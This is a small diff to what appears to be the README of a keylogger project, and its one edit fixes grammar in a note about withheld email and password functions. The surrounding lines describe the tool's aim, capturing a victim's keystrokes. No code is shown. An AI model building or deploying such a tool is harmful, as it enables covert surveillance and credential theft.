@@ -5,7 +5,7 @@ Note: *I, Jacob Glik, do not approbate malicious use of this program, for any re
 
 Summary: Get the victims keystrokes 
 
-Note: The getPassword() and getEmail() function definitions have removed from this code to keep the email, password, and encrypted counterparts secret.
+Note: The getPassword() and getEmail() function definitions have been removed from this code to keep the email, password, and encrypted counterparts secret.
 
 Steps
 1. Get keystrokes from operating system
